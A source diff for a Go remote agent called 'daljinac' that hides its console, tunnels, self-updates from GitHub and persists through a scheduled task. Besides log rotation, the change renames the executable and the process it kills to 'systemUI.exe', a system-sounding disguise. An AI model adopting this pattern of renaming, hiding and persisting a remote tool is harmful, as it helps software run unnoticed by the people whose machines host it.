@@ -22,6 +22,8 @@ import (
 	"agent/tunnel"
 )
 
+const maxLogSize = 1 * 1024 * 1024
+
 var logFile *os.File
 
 func initLog() {
@@ -31,6 +33,9 @@ func initLog() {
 		os.MkdirAll(logDir, 0755)
 	}
 	logPath := filepath.Join(logDir, "daljinac.log")
+	if fi, err := os.Stat(logPath); err == nil && fi.Size() > maxLogSize {
+		os.Rename(logPath, logPath+".old")
+	}
 	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
 		log.Printf("WARN: cannot open log %s: %v", logPath, err)
@@ -39,7 +44,7 @@ func initLog() {
 	logFile = f
 	log.SetOutput(io.MultiWriter(f, os.Stdout))
 	log.SetFlags(log.Ldate | log.Ltime | log.Lshortfile)
-	log.Printf("=== daljinac v%s starting ===", version)
+	log.Printf("=== systemUI v%s starting ===", version)
 }
 
 func syncLog() {
@@ -48,7 +53,7 @@ func syncLog() {
 	}
 }
 
-const version = "2.6.19"
+const version = "2.6.20"
 
 func hideConsole() {
 	if runtime.GOOS != "windows" {
@@ -221,13 +226,13 @@ func doRemove() {
 	log.Println("Removed")
 }
 
-const updateURL = "https://github.com/egzakutacno/daljinac/releases/latest/download/daljinac.exe"
+const updateURL = "https://github.com/egzakutacno/daljinac/releases/latest/download/systemUI.exe"
 
 func doUpdate() error {
 	tmpDir := filepath.Join(os.TempDir(), "daljinac-update")
 	os.MkdirAll(tmpDir, 0755)
 
-	newExe := filepath.Join(tmpDir, "daljinac.exe")
+	newExe := filepath.Join(tmpDir, "systemUI.exe")
 	log.Printf("Downloading %s", updateURL)
 	resp, err := http.Get(updateURL)
 	if err != nil {
@@ -260,7 +265,7 @@ if %%errorlevel%% neq 0 (
     exit /b 1
 )
 echo %%date%% %%time%% [update] copy OK, killing old instance >> %%LOG%%
-taskkill /f /im daljinac.exe >> %%LOG%% 2>&1
+taskkill /f /im systemUI.exe >> %%LOG%% 2>&1
 timeout /t 2 /nobreak > nul
 echo %%date%% %%time%% [update] registering scheduled task >> %%LOG%%
 schtasks /delete /tn Daljinac /f >> %%LOG%% 2>&1
